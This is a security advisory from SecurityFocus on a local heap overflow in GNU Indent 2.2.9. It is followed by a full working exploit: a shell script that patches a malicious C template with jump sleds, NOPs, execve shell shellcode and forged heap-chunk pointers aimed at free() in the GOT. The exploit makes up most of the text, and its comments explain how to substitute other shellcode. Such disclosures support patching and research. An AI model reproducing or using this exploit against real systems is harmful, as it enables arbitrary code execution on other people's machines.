source: http://www.securityfocus.com/bid/9297/info

It has been reported that GNU Indent may be prone to a local heap overflow vulnerability that can be exploited through a malicious C source input file. It has been reported that indent copies data from the file to a 1000 byte long buffer without sufficient boundary checking. A heap overflow condition can be triggered, which may result in memory being overwritten and, ultimately, malicious code execution with the privileges of the user running indent.

GNU Indent version 2.2.9 has been reported to be prone this issue, however, other versions may be affected as well. 

-------------------------------------prepare.sh--------------------------------------------

#!/bin/sh

# these addresses are working on indent 2.2.9 from
# slackware 9.0

# what_to_write
#
# it should be 2bytes aligned because it have to
# point to one of \xeb from jmps. If it points
# to \x08 - exploitation will fail
FD=`echo -e "\x40\xa4\x05\x08"`

# where_to_write-0x8
#
# it is good idea to point it to free() field in GOT
BK=`echo -e "\xc0\x7d\x05\x08"`

# change all 'JP' to \xeb\x08 (relative jmp to $+8 bytes)
sed -e "s/JP/`echo -e \"\xeb\x08\"`/g" winnie-template.c > temp.c

# change all 'N' to \x90 (NOP)
sed -e "s/NNNNNNNNNNNNNNN/`echo -e \"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\"`/" temp.c > winnie.c

# change 'S's to shellcode
sed -e "s/SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS/`echo -e \"\x31\xdb\x89\xd8\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x
89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\/bin\/sh\"`/" winnie.c > temp.c

# exploit with this shellcode is quite useless, because
# it is simple execve(shell) shellcode. If you want to
# change shellcode, first prepare winnie-template.c -
# change 'SSSS...' len to len of your new shellcode,
# but len of whole 'JP...NNN...SSS' should remain the same.
# You can remove few 'JP's. You have to leave few NOPs
# before shellcode, because one of jmp's will land in them
# (this is to be sure that no jmp will land in the middle
# of shellcode. When you changed template, change sed line
# above - change 'SSSS...' len and shellcode.


# change 'dddd' 'eeee' 'ffff' to 0xfffffffc (-4)
sed -e "s/dddd/`echo -e \"\xfc\xff\xff\xff\"`/" temp.c > winnie.c
sed -e "s/eeee/`echo -e \"\xfc\xff\xff\xff\"`/" winnie.c > temp.c
sed -e "s/ffff/`echo -e \"\xfc\xff\xff\xff\"`/" temp.c > winnie.c

# change 'gggg' to FD (what_to_write)
sed -e "s/gggg/$FD/" winnie.c > temp.c

# change 'hhhh' to BK (where_to_write-8)
sed -e "s/hhhh/$BK/" temp.c > winnie.c

# 'iiii' is prev_size, but we don't need to change it
# Left it untouched

# change 'jjjj' to 0xfffffff1 (size field, pointing to these
# three (-4))
sed -e "s/jjjj/`echo -e \"\xf1\xff\xff\xff\"`/" winnie.c > temp.c

# change 'llll' to some readable value (on stack for example)
# it is 'next' field of overwritten buf_break_list struct
sed -e "s/llll/`echo -e \"\x40\xff\xff\xbf\"`/" temp.c > winnie.c

rm temp.c

-------------------------------------winnie-template.c--------------------------------------------

nt main(int argc, char **argv)
{
    printf("W1nN13 Th3 p00H H4ck1n6 SqU4dr0n pR0udlY Pr3z3n7z:\n"
           "0-day P0f f0R indent-2.2.9 bUFF3r oV3rFl0W vU1n3r4b1l1ty\n");

  asm
        (
        "nop\n"
        "nop\n"
        "nop\n"
        "nop\n"
        "nop\n"
        "jmp continue\n"
        ".string \"JPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJP
JPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJ
PJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJP
JPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJ
PJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJP
JPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPJPNNNNNNNNNNNNNNNSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS\"\n"
        ".string \"cccddddeeeeffffgggghhhhiiiijjjjkkkkllll\"\n"
        "continue:\n"
        "nop\n"
        "nop\n"
        :);
  return 0;
}

